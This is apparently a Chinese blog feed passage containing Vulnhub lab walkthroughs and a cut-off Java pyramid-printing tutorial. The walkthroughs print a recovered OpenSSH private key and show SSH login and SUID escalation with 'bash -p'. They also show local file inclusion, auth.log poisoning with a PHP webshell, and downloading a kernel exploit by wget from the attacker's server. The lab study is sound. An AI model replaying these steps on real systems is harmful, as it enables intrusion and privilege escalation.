KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAtHCsSzHtUF8K8tiOqECQYLrKKrCRsbvq6iIG7R9g0WPv9w+gkUWeIzBScvglLE9flolsKdxfMQQbMVGqSADnYBTavaigQekue0bLsYk/rZ5FhOURZLTvdlJWxzbIeyC5a5F0Dl9UYmzChe43z0Do0iQw178GJUQaqscLmEatqIiT/2FkF+AveW3hqPfbrw9vA9QAIUA3ledqr8XEzY//Lq0+sQg/pUu0KPkY18i6vnfiYHGkyW1SgryPh5x9BGTk3eRYcNw6mDbAjXKKCHGM+dnnGNgvAkqT+gZWz/Mpy0ekauk6NP7NCzORNrIXAYFa1rWzaEtypHwYkCEcfWJJlZ7+fcEFa5B7gEwt/aKdFRXPQwinFliQMYMmau8PZbPiBIrxtIYXy3MHcKBIsJ0HSKv+HbKW9kpTL5OoAkB8fHF30ujVOb6YTuc1sJKWRHIZY3qe08I2RXeExFFYu9oLug0dtHYdJHFL7cWiNv4mRyJ9RcrhVL1V3CazNZKKwraRAAAFgH9JQL1/SUC9AAAAB3NzaC1yc2EAAAGBALRwrEsx7VBfCvLYjqhAkGC6yiqwkbG76uoiBu0fYNFj7/cPoJFFniMwUnL4JSxPX5aJbCncXzEEGzFRqkgA52AU2r2ooEHpLntGy7GJP62eRYTlEWS073ZSVsc2yHsguWuRdA5fVGJswoXuN89A6NIkMNe/BiVEGqrHC5hGraiIk/9hZBfgL3lt4aj3268PbwPUACFAN5Xnaq/FxM2P/y6tPrEIP6VLtCj5GNfIur534mBxpMltUoK8j4ecfQRk5N3kWHDcOpg2wI1yighxjPnZ5xjYLwJKk/oGVs/zKctHpGrpOjT+zQszkTayFwGBWta1s2hLcqR8GJAhHH1iSZWe/n3BBWuQe4BMLf2inRUVz0MIpxZYkDGDJmrvD2Wz4gSK8bSGF8tzB3CgSLCdB0ir/h2ylvZKUy+TqAJAfHxxd9Lo1Tm+mE7nNbCSlkRyGWN6ntPCNkV3hMRRWLvaC7oNHbR2HSRxS+3Fojb+JkcifUXK4VS9VdwmszWSisK2kQAAAAMBAAEAAAGBALCyzeZtJApaqGwb6ceWQkyXXrbjZil47pkNbV70JWmnxixY31KjrDKldXgkzLJRoDfYp1Vu+sETVlW7tVcBm5MZmQO1iApDgUMzlvFqiDNLFKUJdTj7fqyOAXDgkv8QksNmExKoBAjGnM9u8rRAyj5PNo1wAWKpCLxIY3BhdlneNaAXDV/cKGFvW1aOMlGCeaJ0DxSAwG5Jys4Ki6kJ5EkfWo8elsUWF30wQkW9yjIPUF5Fq6udJPnmEWApvLt62IeTvFqg+tPtGnVPleO3lvnCBBIxf8vBk8WtoJVJdJt3hO8c4jkMtXsvLgRlve1bZUZX5MymHalN/LA1IsoC4Ykg/pMg3s9cYRRkm+GxiUU5bv9ezwM4BmkoQPvyUcye28zwkO6tgVMZx4osrIoN9WtDUUdbdmD2UBZ2n3CZMkOV9XJxeju51kH1fs8q39QXfxdNhBb3Yr2RjCFULDxhwDSIHzG7gfJEDaWYcOkNkIaHHgaV7kxzypYcqLrs0S7C4QAAAMEAhdmD7Qu5trtBF3mgfcdqpZOq6+tW6hkmR0hZNX5Z6fnedUx//QY5swKAEvgNCKK8SmiFXlYfgH6K/5UnZngEbjMQMTdOOlkbrgpMYih+ZgyvK1LoOTyMvVgT5LMgjJGsaQ5393M2yUEiSXer7q90N6VHYXDJhUWX2V3QMcCqptSCS1bSqvkmNvhQXMAaAS8AJw19qXWXim15SpWoqdjoSWEJxKeFTwUW7WOiYC2Fv5ds3cYOR8RorbmGnzdiZgxZAAAAwQDhNXKmS0oVMdDy3fKZgTuwr8My5Hyl5jra6owj/5rJMUX6sjZEigZa96EjcevZJyGTF2uV77AQ2Rqwnbb2GljdLkc0Yt9ubqSikd5f8AkZlZBsCIrvuDQZCoxZBGuD2DUWzOgKMlfxvFBNQF+LWFgtbrSPOgB4ihdPC1+6FdSjQJ77f1bNGHmn0amoiuJjlUOOPL1cIPzt0hzERLj2qv9DUelTOUranOcUWrPgrzVGT+QvkkjGJFX+r8tGWCAOQRUAAADBAM0cRhDowOFx50HkE+HMIJ2jQIefvwpmBn2FN6kw4GLZiVcqUT6aY68njLihtDpeeSzopSjyKh10bNwRS0DAILscWg6xc/R8yueAeIRcw85udkhNVWperg4OsiFZMpwKqcMlt8i6lVmoUBjRtBD4g5MYWRANO0Nj9VWMTbW9RLiRkuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实看这个样子就应该知道是ssh连接的密钥，结合上面获取到的用户是<code>oscp</code>，所以我们来进行ssh连接，首先在kali里面创建一个<code>id_rsa</code>的文件，然后把解密出来的东西复制进去，然后给文件赋值权限，这里我赋值的是<code>777</code>的权限，如下图操作</p><p><img src="/images/wordimage/2022/0510/idrsa.png"></p><p>然后我们在使用ssh命令连接，命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -i id_rsa oscp@192.168.241.170<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现连接失败，说的是<code>777</code>权限不行，那么我们重新赋值为<code>600</code>权限。</p><p><img src="/images/wordimage/2022/0510/baocuossh.png"></p><p>如下图，连接成功！！</p><p><img src="/images/wordimage/2022/0510/sshsucc.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>我们先来三问分别是<code>id</code>,<code>pwd</code>,<code>whoami</code>，如下图，发现就是普通用户</p><p><img src="/images/wordimage/2022/0510/userid.png"></p><p>经过资料查找，需要用到一种叫做<code>SUID</code>的提权，如果想知道什么是SUID提权可以看看这个文章👉<a href="https://www.freebuf.com/articles/web/272617.html">SUID提权</a>。</p><p>这里我们使用命令来查找，系统上面运行的所有<code>SUID</code>可执行文件，如下命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而真正能使用提权的，有下面这些👇。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">nmapvimfindbashmorelessnanocpawk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图，这里选择的是bash。</p><p><img src="/images/wordimage/2022/0510/bash.png"></p><p>使用如下命令来进行成功提权。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/bash -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，成功提权到root，然后查看flag。</p><p><img src="/images/wordimage/2022/0510/binbash.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>核心是SUID提权</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Tomato靶机实战</title>
      <link href="/2022/056e02adb4.html"/>
      <url>/2022/056e02adb4.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/tomato-1,557/">https://www.vulnhub.com/entry/tomato-1,557/</a></p><blockquote><p>KALI地址：192.168.94.108</p><p>靶机地址：192.168.94.30</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下，进行发现主机</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.94.30<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图发现靶机IP地址</p><p><img src="/images/wordimage/2022/0506/net.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>这里使用的工具是Nmap来进行的主机扫描，使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.94.30<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图扫描结果，发现开放了<code>21,80,2211,8888</code>端口</p><p><img src="/images/wordimage/2022/0506/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然开放了80端口，那么肯定要进行一次目录扫描，使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.94.30<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果如下，发现并没有多少东西，但是感觉第一个有东西</p><p><img src="/images/wordimage/2022/0506/dirb.png"></p><p>如下图访问目录<code>antibot_image</code>目录，如下图，发现了一堆东西</p><p><img src="/images/wordimage/2022/0506/dongxi.png"></p><hr><h3 id="4-网页信息收集"><a href="#4-网页信息收集" class="headerlink" title="4.网页信息收集"></a>4.网页信息收集</h3><p>其实经过搜索，看源代码，看网络，在<code>http://192.168.94.30/antibot_image/antibots/info.php</code>这个地址下面查看源代码发现了东西，如下图。</p><p><img src="/images/wordimage/2022/0506/inter.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a>1.文件包含漏洞</h3><p>经过上面信息收集，我们发现<code>antibot_image</code>在这个目录下面有一堆东西，然后看代码<code>include</code>是包含，如下图经过测试发现拥有文件包含漏洞，这里的测试是读取<code>/etc/passwd</code></p><p><img src="/images/wordimage/2022/0506/include.png"></p><p>在思考如何利用的时候，想到，可以尝试读取<code>/var/log/auth.log</code>这个文件，这个文件用处如下，下面这段话是网上找的。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/var/ log / auth.log 这是一个文本文件，记录了所有和用户认证相关的 日志 。 无论是我们通过 ssh 登录，还是通过 sudo 执行命令都会在 auth.log 中产生记录。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先说思路，思路是往日志文件写入一句话木马，然后连接，写入方法就是使用一句话木马来作为用户进行SSH连接，这样<code>auth.log</code>就会记录我们的登录，一句话木马也就被写入进去了，先查看是否能读取这个文件，如下图，发现可以读取。</p><p><img src="/images/wordimage/2022/0506/log.png"></p><p>接下来就可以在日志里面写入一句话木马了，如下图，使用ssh连接失败日志写入一句木马。</p><p><img src="/images/wordimage/2022/0506/phpmuma.png"></p><p>然后我们使用蚁剑验证一下是否有数据连接，是否成功，如下图，发现是成功的，url地址是<code>http://192.168.94.30/antibot_image/antibots/info.php?image=../../../../../../../var/log/auth.log</code></p><p><img src="/images/wordimage/2022/0506/yijianok.png"></p><p>然后我们右键在此打开终端，如下图。</p><p><img src="/images/wordimage/2022/0506/disk.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>首先来三问分别是<code>id</code>,<code>whoami</code>,<code>pwd</code>如下图。</p><p><img src="/images/wordimage/2022/0506/three.png"></p><p>经过一番探索，指的是看<code>tmp</code>目录，看网站目录，看<code>home</code>目录并没有发现什么东西，我们查看系统版本，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现是4.4这种版本的，我们顺便查看<code>issue</code>文件夹，发现是16.04版本。</p><p><img src="/images/wordimage/2022/0506/uname.png"></p><p>我们在KALI搜索一下使用命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token number">4.4</span>.0-21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，搜索到了利用条件，但是经过测试之后，发现失败了这里用的是<code>44300.c</code></p><p><img src="/images/wordimage/2022/0506/search.png"></p><p>于是去github上面了一下，链接如下,选择的是<code>CVE-2017-6074</code></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">https://github.com/kkamagui/linux-kernel-exploits<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，已经下载到kali里面</p><p><img src="/images/wordimage/2022/0506/6074.png"></p><p>然后我们在kali运行sh文件编译，如下图，编译成功之后会生成一个文件</p><p><img src="/images/wordimage/2022/0506/2017.png"></p><p>之后我们在KALI开启简单的HTTP服务，然后在再靶机上面运行即可，如下命令，开启的是KALI的apache服务。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后我们把生成的文件放在网站目录下面也就是<code>/var/www/html</code>目录下面即可，使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> CVE-2017-6074 /var/www/html/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后我们回到靶机，在tmp目录下面使用wget命令下载kali刚刚复制的文件用来提权，顺便赋予777权限，方便操作，如下图。</p><p><img src="/images/wordimage/2022/0506/777.png"></p><p>然后我们在靶机运行即可，但是运行失败，一运行我虚拟机就直接卡死了，啥也没提醒只有重新启动，但是根据网上其他WP来看，这一步是成功了。</p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>个人总结，学到了一个东西，如果可以文件包含可以尝试包含<code>/var/log/auth.log</code>如果能包含，就可以ssh连接写入东西尝试一下。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java实现空心金字塔</title>
      <link href="/2022/0492a96eda.html"/>
      <url>/2022/0492a96eda.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习java，遇到了一个经典打印题目，空心金字塔，初学者记录，根据网上教程，有一句话感觉很好，就是先把麻烦的问题转换成很多的简单问题，最后一一解决就可以了，然后先死后活，先把程序写死，后面在改成活的。</p><p>如下图是空心金字塔最终的实现效果，先要求用户输入层数然后输出</p><p><img src="/images/wordimage/2022/0428/jinzitaxiaoguo.png"></p><hr><h2 id="一-普通矩形"><a href="#一-普通矩形" class="headerlink" title="一.普通矩形"></a>一.普通矩形</h2><p>首先我们先把这个需求拆分，肯定是一堆星号里面扣出一个三角，那么我们先简单输出一个矩形，如下代码。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//循环五次每次输出五个星号</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">5</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"*****"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出效果图如下，非常简单。</p><p><img src="/images/wordimage/2022/0428/juxing.png"></p><hr><h2 id="二-普通三角形"><a href="#二-普通三角形" class="headerlink" title="二.普通三角形"></a>二.普通三角形</h2><p>既然输出了普通矩形，那么我们就可以来思考如何输出三角形，如下分析，是我们想要输出的效果，第一层是输出的一个，第二层是输出的两个，以此内推，思路是我们可以使用循环嵌套，第一层循环用来循环层数，第二层循环用来循环每层星号的个数。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">*//第一层为一个**//第二层位两个***//第三层位三个*********<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>意思就是我们每层循环的个数小于等于层数即可，如下增加代码。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//i为层数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">5</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//j为每层个数</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> i <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//print和println的区别就是print输出不会自带换行println会</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//每次循环完成一层那么就换行</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图输出结果，可以输出三角形</p><p><img src="/images/wordimage/2022/0428/sanjiaox.png"></p><hr><h2 id="三-输出等腰三角形"><a href="#三-输出等腰三角形" class="headerlink" title="三.输出等腰三角形"></a>三.输出等腰三角形</h2><p>上面我们输出了普通三角形，我们现在需要输出等腰三角形，如下分析，也是我们需要输出的结果，首先可以发现，第一层为一个星号，第二层为三个星号，第三个为五个星号，是按按照奇数来的，但是也可以是<code>2 * 层数 -1</code>，所以每层的个数是<code>2 * 层数 -1</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">    *   ***  ***** ****************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下代码修改，可以输出，修改的地方就是第二层循环<code>j&lt;=i</code>变成了<code>j&lt;= 2 * i - 1</code>，因为i代表的是层数。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//i为层数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">5</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//j为每层个数</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//print和println的区别就是print输出不会自带换行println会</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//每次循环完成一层那么就换行</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图输出效果，发现没有输出我们想要的效果。</p><p><img src="/images/wordimage/2022/0428/dengyao.png"></p><p>我们需要进行修改，我们再来看一下最终效果，如下，发现前面是有空格的，空格的规律是啥啊？数一数可以发现，第一层的空格是四个，第二层的空格是3个，第三层的空格是2个……，仔细思考，发现就是总层数减去当前层数，比如第一层就是<code>5-1</code>，第二层就是<code>5-2</code>。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">    *   ***  ***** ****************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路是这样，代码的思路就是先在前面打印完成空格之后在打印星号，如下代码修改，修改的地方是在第二层循环的前面，加上了一个循环，是为了循环输出空格。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//i为当前层数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">5</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//打印空格</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token operator">-</span>i<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//j为每层个数</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//print和println的区别就是print输出不会自带换行println会</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//每次循环完成一层那么就换行</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下输出效果。</p><p><img src="/images/wordimage/2022/0428/dengyao2.png"></p><hr><h2 id="四-输出空心金字塔"><a href="#四-输出空心金字塔" class="headerlink" title="四.输出空心金字塔"></a>四.输出空心金字塔</h2><p>前面已经输出了等腰三角形，现在需要把里面掏空，最终效果应该如下，分析一下怎么才能这样输出，首先不变的是第一层和最后一层，变化的是中间的层数，发现中间的都是输出了第一个和最后一个星号，最后一排就是输出全部</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">    *   * *  *   * *     **********<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路是，第一个星号即为判断，当<code>j==1</code>的时候那么就是输出第一个星号，当<code>j == 2 * i - 1</code>的时候即可输出最后一个星号，所以代码如下，更改的地方在循环每层循环的地方，加了一个判断，<code>j==1</code>的时候也就是输出每层第一个的时候，<code>j == 2 * i -1</code>的时候就是输出最后一个的时候。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//i为当前层数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">5</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//打印空格</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token operator">-</span>i<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//j为每层个数</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> j <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">//print和println的区别就是print输出不会自带换行println会</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" 